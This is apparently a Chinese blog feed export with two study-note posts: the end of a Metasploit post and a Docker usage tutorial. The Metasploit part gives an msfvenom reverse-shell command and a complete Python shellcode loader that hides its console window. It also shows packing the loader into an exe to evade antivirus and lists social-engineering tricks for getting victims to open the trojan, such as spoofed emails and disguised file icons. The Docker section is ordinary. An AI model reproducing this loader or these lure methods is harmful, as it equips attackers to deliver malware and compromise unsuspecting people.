src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129221740.png"></p><h2 id="MSF免杀（windows）"><a href="#MSF免杀（windows）" class="headerlink" title="MSF免杀（windows）"></a>MSF免杀（windows）</h2><p><code>msfvenom -p windows/meterpreter/reverse_tcp LPORT=46892 LHOST=192.168.220.129  -e x86/shikata_ga_nai -i 11 -f py -o /mo.py</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129223121.png"></p><p>查看py文件</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129223149.png"></p><p>使用python脚本，将mo.py中的值放入脚本中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xbb\x7a\x62\x0a\x22\xdb\xc9\xd9\x74\x24\xf4\x58\x29&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xc9\xb1\x97\x31\x58\x15\x03\x58\x15\x83\xe8\xfc\xe2&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x8f\xdc\x50\xbc\x22\x5d\xbf\x0c\x65\xe9\x1b\x79\xcd&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x39\xad\x30\x7c\x0c\x5d\x21\xfd\x87\x61\x46\x2b\xc8&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x35\xc0\x38\x81\xbf\xd5\xb9\xd7\x14\x0c\xcb\x00\x79&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x12\x5d\xd0\xb1\xee\xfe\x06\x1d\x51\x8a\x92\x29\xd2&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xa4\x4c\xd0\x08\x22\xdc\x4f\x24\xb2\x2b\x2b\xda\x00&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x5f\xa3\x1d\x01\xfe\xe9\xf2\x62\xeb\xa7\x46\x63\xce&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xac\x45\xe4\x8b\xa1\xa3\x85\x14\xe1\x1e\x06\xa7\x6e&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x7a\x03\xe7\x05\xd2\x41\x32\x24\x3c\x48\x72\xf2\x57&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x0f\x58\x58\x5c\xf6\xd5\x0f\x5b\x6b\xca\x34\xdd\x5d&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xe0\x62\x5a\xc2\xde\x3d\xdc\xb3\xf0\x3e\x78\x31\x90&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x6c\x5f\x58\xee\x84\xb0\x30\x87\x60\xec\x58\x25\xad&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x4a\x6b\xc6\xb7\xd8\x70\xb8\x2f\xc8\xd9\xcf\xec\x10&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xcb\x67\x90\xf2\xdf\xf2\x4a\xf3\x23\xf6\xd1\x12\xa5&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xfb\x10\xa9\x56\x4e\xd0\xdc\x10\x21\x1d\xb5\x58\x17&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xe1\x6d\x69\x74\xc7\xac\x58\x1a\xc9\xf7\x00\xf8\x54&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x76\x05\x6d\xd4\x9e\x9c\x22\xdb\x0f\xa9\xfa\xe3\x8b&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x8e\x1a\x1f\x60\xdb\xbe\xef\x2f\x73\xa5\x42\x02\x93&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x89\x0f\x42\xfa\xae\xb9\x9b\xec\xe2\x53\x56\x38\x51&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x45\x6f\xb8\xd2\xff\x3a\x73\x44\xe4\x38\x38\xf2\x28&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x76\xf0\xca\x34\x80\x35\x55\x83\xad\x29\x23\x8a\xca&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x07\xcf\x88\x30\x15\x2e\xc0\x99\x1e\xdd\xb6\xbb\x49&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x92\x1e\x9a\xdd\xcf\x58\xe9\x84\x66\x3d\x38\xfc\x28&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x99\xa4\x19\x09\xe6\x1c\xf5\xad\x4f\xa1\x81\xbf\x51&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x3d\x0b\x9e\x27\x60\x20\x7d\x59\x6e\x82\x7c\x25\x5c&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x4e\x34\x25\xed\xc3\xb1\x45\x02\x92\x75\xf5\x11\xa5&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x54\xdc\x1b\x6f\x9b\x56\xd2\xb5\x80\x66\xcf\xe1\x61&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xd1\x01\xe4\x31\x52\xd9\x5b\x01\x37\x29\xa8\xef\xc8&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x53\x9b\x1c\x47\x30\x9e\xe4\x6a\xda\xb3\xd5\xfd\xf5&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xb8\x13\xbc\x92\xbb\xb4\x82\x70\x02\xad\xef\x3b\x70&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xf4\x98\x84\x31\x52\x97\x60\x2b\x2e\x84\x9b\x7f\xb7&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x30\x85\x58\xef\x8c\x95\xa0\x56\x2f\xef\x20\x61\x0d&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x94\x66\xbf\xa7\xd0\x71\x56\x52\x82\xb1\xa0\x19\xe4&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x7e\xd9\x90\x96\x2b\x16\xea\x4c\xde\xcd\x05\x23\x6e&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xc2\x4b\xc0\x68\x1b\xba\xc1\x1d\xca\x26\x74\xd1\x92&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x4e\xd3\x70\x8a\x43\x41\xbe\x59\xf1\x20\x33\x89\xb9&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x2b\xdb\x9a\x0f\xad\x8d\x80\x4c\x78\x52\xe7\x0a\xf7&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x47\xd8\x5c\x0c\x3c\xd4\x0d\x3d\xe7\xbd\x2d\x22\xb1&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x37\x0a\xd9\x5e\xf2\xd5\xd2\x56\xe0\x56\x1c\x42\xc3&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x75\x92\x55\x7c\x86\x6a\xb4\xcd\x3a\xce\x4d\xea\x4f&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xa4\x31\xc6\xe0\x16\x27\xa5\xf4\x9d\x79\x5e\xfc\x60&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xeb\xef\x35\x33\x6e\x5b\x6d\xec\x8f\x9b\x1e\xb1\xf6&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x35\xeb\x1f\x3b\xab\x99\x9a\x34\x2a\xf8\x25\x38\xba&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x40\xe9\xb0\x51\xbc\xdf\x60\x16\x62\xc3\x63\x64\xbd&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xb5\x28\xf6\x4c\x71\xd2\x01\x74\x11\xf0\xd7\xcd\x4f&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x34\xad\xc2\x65\x4c\xeb\x78\xc1\xbf\xba\x80\x6c\x46&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\x6a\x15\x15\x03\x5e\x8d\x65\x8e\x69\x89\x29\x7f\x67&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;\xea\xc1\x6b\x62\xb0\xd4&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#libc = CDLL(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">PROT_READ = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">PROT_WRITE = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">PROT_EXEC = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executable_code</span>(<span class="params">buffer</span>):</span></span><br><span class="line"></span><br><span class="line">buf = c_char_p(buffer)</span><br><span class="line"></span><br><span class="line">size = <span class="built_in">len</span>(buffer)</span><br><span class="line"></span><br><span class="line">addr = libc.valloc(size)</span><br><span class="line"></span><br><span class="line">addr = c_void_p(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> == addr: </span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to allocate memory&quot;</span>)</span><br><span class="line"></span><br><span class="line">memmove(addr, buf, size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> != libc.mprotect(addr, <span class="built_in">len</span>(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">&quot;Failed to set protection on buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line"></span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()   </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> whnd != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="number">666</span>==<span class="number">666</span>:</span><br><span class="line"></span><br><span class="line">  ctypes.windll.user32.ShowWindow(whnd, <span class="number">0</span>)   </span><br><span class="line"></span><br><span class="line">  ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;..................................&quot;</span>*<span class="number">666</span></span><br><span class="line"></span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">  ctypes.c_int(<span class="built_in">len</span>(shellcode)),</span><br><span class="line"></span><br><span class="line">  ctypes.c_int(<span class="number">0x3000</span>),</span><br><span class="line"></span><br><span class="line">  ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">old = ctypes.c_long(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(<span class="built_in">len</span>(shellcode)),<span class="number">0x40</span>,ctypes.byref(old))</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line"></span><br><span class="line"> buf,</span><br><span class="line"></span><br><span class="line"> ctypes.c_int(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Code By Luan&quot;</span></span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p><strong>然后下载支持将python生成exe的软件pyinstall</strong></p><p><strong><a href="https://nchc.dl.sourceforge.net/project/pyinstaller/2.0/pyinstaller-2.0.zip">https://nchc.dl.sourceforge.net/project/pyinstaller/2.0/pyinstaller-2.0.zip</a></strong></p><p>使用命令生成exe文件</p><p><code>python PyInstaller.py --console --onefile  mo.py</code></p><p>运行即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129224725.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129224750.jpg"></p><h2 id="分析木马"><a href="#分析木马" class="headerlink" title="分析木马"></a>分析木马</h2><p>这里使用微步云沙盒进行分析</p><p>很显然没有免杀的木马一定会报毒</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129224814.png"></p><p>能过一些小众的杀软</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129224854.png"></p><h2 id="诱导对方点开木马的方法？"><a href="#诱导对方点开木马的方法？" class="headerlink" title="诱导对方点开木马的方法？"></a>诱导对方点开木马的方法？</h2><p>即使我们做了免杀，过了av，但如何让对方打开确实是个问题</p><p>1.最简单的一种就是将木马<strong>改名</strong>，改为类似360.exe或者一些游戏的名字，如何将图标换一下，成功伪装</p><p>2.<strong>邮件冒名欺骗。</strong>用匿名邮件工具冒充好友或大型网站、机构单位向别人发木马附件，别人下载附件并运行的话就中木马了。</p><p>3.文件夹惯性点击。把木马文件伪装成文件夹图标后，放在一个文件夹中，然后在外面再套三四个空文件夹，很多人出于连续点击的习惯，点到那个伪装成文件夹木马时，也会收不住鼠标点下去，这样木马就成功运行了。</p><p>4.<strong>zip伪装。</strong>这个方法是最新的，将一个木马和一个损坏的zip包（可自制）捆绑在一起，然后指定捆绑后的文件为zip图标，这样一来，除非别人看了他的后缀，否则点下去将和一般损坏的zip没什么两样，根本不知道其实已经有木马在悄悄运行了。</p><p>5.在某个公文包或者可以上传附件的论坛传上<strong>捆绑</strong>好的木马，然后把链接发给受害者。</p><p>6.通过社工，找到对方最近常用的文件，然后内置一个木马，这样即可信又能做到无影无踪</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;MSF学习笔记&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;MSF简介&quot;&gt;&lt;a href=&quot;#MSF简介&quot; class=&quot;headerlink&quot; title=&quot;MSF简介&quot;&gt;&lt;/a&gt;MSF简介&lt;/h1&gt;&lt;blockquote&gt;
</summary>
      
    
    
    
    <category term="-学习笔记" scheme="https://blog.abinix.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://blog.abinix.top/2021/08/13/Docker%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.abinix.top/2021/08/13/Docker%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-12T16:04:49.000Z</published>
    <updated>2021-12-23T15:40:57.510Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">Docker学习笔记</h1><p>[TOC]</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>Docker的思想来自于集装箱，集装箱解决了什么问题？在一艘大船上，可以把货物规整的摆放起来。并且各种各样的货物被集装箱标准化了，集装箱和集装箱之间不会互相影响。那么我就不需要专门运送水果的船和专门运送化学品的船了。只要这些货物在集装箱里封装的好好的，那我就可以用一艘大船把他们都运走。</p></blockquote><p>我的理解就是，他是一个大环境，然后在docker里可以自己搭建许多小环境，并且非常灵活，想要的环境也可以从镜像库中拉取，这就解决了我们很多时候的环境问题、</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806153401.gif"></p><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>在kali2020版本中我使用两条命令即安装了docker</p><blockquote><p>sudo apt update</p><p>sudo apt install -y docker.io</p></blockquote><p>1.</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806155436.png"></p><p>​    更新软件包可以让我们安装的软件版本更新</p><p>2.</p><p>​    使用命令 <code>sudo apt install -y docker.io</code>进行安装，出现如下，选确定即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806155553.png"></p><p>3.</p><p>​    安装完成，通过命令 <code>docker -v</code> 查看版本</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003804.png"></p><p>​    可以看到安装完毕</p><h1 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h1><p>ps：这里使用自己vps上的docker服务来进行测试</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li><p>启动docker</p><p>systemctl start docker</p></li><li><p>关闭docker</p><p>systemctl stop docker</p></li><li><p>重启docker</p><p>systemctl restart docker</p></li><li><p>查看docker信息</p><p>docker info</p></li><li><p>列出本地镜像</p><p>docker images</p></li><li><p>查找镜像</p><p>docker search &lt; &gt;</p></li><li><p>列出已启动的容器</p><p>docker ps （docker ps -a 表示显示已存在的所有容器）</p></li><li><p>拉取镜像</p><p>docker pull</p></li><li><p>容器状态</p><p>打开： docker start id</p><p>关闭： docker stop id</p></li><li><p>删除操作</p><p>删除镜像：docker rmi id</p><p>删除容器：docker rm id</p><p>ps：一般都是先停止容器，然后删除容器，最后删除镜像</p></li></ul><h2 id="镜像与容器"><a href="#镜像与容器" class="headerlink" title="镜像与容器"></a>镜像与容器</h2><p><strong>一句话讲清容器与镜像的关系：容器 = 镜像image + 读写层</strong> </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806161409.jpeg"></p><p>可以看到容器与镜像是包含的关系，镜像运行起来就是容器，通过镜像才能运行容器，所以这两个是完全不同的东西，也是docker最重要的两个部分</p><blockquote><p>docker镜像实际上是由一层一层的系统文件组成，这种层级的文件系统被称为UnionFS( Union file system  统一文件系统)，镜像可以基于dockerfile构建，dockerfile是一个描述文件，里面包含了若干条密令，每条命令都会对基础文件系统创建新的层次结构。</p></blockquote><h2 id="镜像常用命令"><a href="#镜像常用命令" class="headerlink" title="镜像常用命令"></a>镜像常用命令</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><p>命令：<code>docker images</code>  可查看本地所有的镜像</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003859.png"></p><table><thead><tr><th>列表</th><th>意思</th></tr></thead><tbody><tr><td>TAG</td><td>镜像的标签（版本）同一个仓库有多个TAG的镜像，多个版本，用REPOSITORY:TAG来定义不同的镜像；TAG来定义不同的镜像；</td></tr><tr><td>IMAGE ID</td><td>镜像ID，镜像的唯一标识</td></tr><tr><td>CREATE</td><td>镜像创建时间</td></tr><tr><td>SIZE</td><td>镜像大小</td></tr><tr><td>OPTIONS</td><td>可选参数：-a 显示所有镜像（包括中间层）-q 只显示镜像 ID-qa可以组合–digests 显示镜像的摘要信息 –no-trunc 示完整的镜像信息</td></tr><tr><td>REPOSITORY</td><td>镜像的仓库源</td></tr></tbody></table><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><p>命令：<code>docker search</code> </p><p>从 <a href="https://hub.docker.com/">Docker Hub </a>上检索镜像的详细信息。如：docker search java</p><p>例：搜索所有镜像名包含 java 的</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003923.png"></p><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>命令：<code>docker pull 镜像名称:[TAG]</code></p><p>例：这里拉取一个shiro反序列化的镜像，用来复现</p><p>命令： <code>docker pull medicean/vulapps:s_shiro_1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806164410.png"></p><p>如上图拉取镜像即会下载一些东西</p><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p>命令： <code>docker rmi id</code></p><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><p>命令：<code>docker build  [OPTIONS] PATH</code></p><p>如果想要构建镜像得有dockerfile，通过dockerfile来构建</p><p>例如：</p><p>命令：<code> docker build -t ezphp .</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210813003940.png"></p><h2 id="容器常用命令"><a href="#容器常用命令" class="headerlink" title="容器常用命令"></a>容器常用命令</h2><h3 id="创建容器与端口映射"><a href="#创建容器与端口映射" class="headerlink" title="创建容器与端口映射"></a>创建容器与端口映射</h3><p>命令：<code>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</code></p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>–name</td><td>“容器新名字”：为容器指定一个名称；</td></tr><tr><td>-i</td><td>以交互模式运行容器，通常与-t或者-d同时使用；</td></tr><tr><td>-t</td><td>为容器重新分配一个伪输入终端，通常与-i同时使用；</td></tr><tr><td>-d</td><td>后台运行容器，并返回容器ID；</td></tr><tr><td>-P</td><td>随机端口映射，容器内部端口随机映射到主机的端口</td></tr><tr><td>-p</td><td>指定端口映射，格式为：主机(宿主)端口:容器端口</td></tr></tbody></table><p>一般<strong>常用的命令</strong>即是 <code>docker run -d -p 端口号:80 name</code></p><p><strong>启动交互式容器</strong>：<code>docker run -it -d -p name</code></p><p>举个栗子（还是用到上面的shiro例子）：</p><p>命令：<code>docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code>（映射在8080端口）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806165611.png"></p><p>返回一串数字，这个容器id</p><p>这时代表容器创建完成，我们打开ip对应的端口号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210806165721.png"></p><p>如图所示，这就是一个容器，里面配备所有环境，成功访问</p><h3 id="列出容器"><a href="#列出容器" class="headerlink" title="列出容器"></a>列出容器</h3><p>命令：<code>docker ps [OPTIONS]</code></p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td>-a</td><td>显示所有的容器，包括未运行的。</td></tr><tr><td>-f</td><td>根据条件过滤显示的内容。</td></tr><tr><td>-format</td><td>指定返回值的模板文件。</td></tr><tr><td>-l</td><td>显示最近创建的容器。</td></tr><tr><td>-n</td><td>列出最近创建的n个容器。</td></tr><tr><td>–no-trunc</td><td>不截断输出。</td></tr><tr><td>-q</td><td>静默模式，只显示容器编号。</td></tr><tr><td>-s</td><td>显示总的文件大小。</td></tr></tbody></table><h3 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h3><p>启动命令：<code>docker start id</code></p><p>停止命令：<code>docker stop id</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808230755.png"></p><p>重启命令：<code>docker restart id</code>、</p><h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p>命令： <code>docker rm id</code></p><p>与镜像不同的是 这里删除命令是rm ，镜像是rmi（images）</p><h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><p>命令：<code>docker exec -it id 执行命令</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210808232139.png"></p><p>这时就进入到docker里面了，可以查看docker里面的代码、环境等，也可以更改里面的东西。</p><p>ps：进入docker里面，更改或者删掉里面的任何东西后，如果重启docker，都会恢复的。所以如果需要docker里面的某些东西做些永久性的改变，就需要<code>docker commit</code>。</p><h3 id="容器文件拷贝"><a href="#容器文件拷贝" class="headerlink" title="容器文件拷贝"></a>容器文件拷贝</h3><p>#从容器内拷贝<br><code>docker cp 容器ID/名称: 容器内路径  容器外路径</code></p><p>#从容器外拷贝<br><code>docker  cp 容器外路径 容器ID/名称: 容器内路径</code></p><h2 id="Dockerfiles"><a href="#Dockerfiles" class="headerlink" title="Dockerfiles"></a>Dockerfiles</h2><blockquote><p>Dockerfile 包含创建镜像所需要的全部指令。基于在 Dockerfile 中的指令，我们可以使用 <code>Docker build</code> 命令来创建镜像。通过减少镜像和容器的创建过程来简化部署。</p></blockquote><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><p>所有 Dockerfile 都必须以 <code>FROM</code> 命令开始。<code>FROM</code> 命令会指定镜像基于哪个基础镜像创建，接下来的命令也会基于这个基础镜像（注：CentOS 和 Ubuntu 有些命令可是不一样的）。<code>FROM</code> 命令可以多次使用，表示会创建多个镜像。具体语法如下：</p><p><code>FROM &lt;image name&gt;</code></p><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><p>设置该镜像的作者，可以写自己名字</p><p><code>MAINTAINER &lt;author name&gt;</code></p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>在 shell 或者 exec 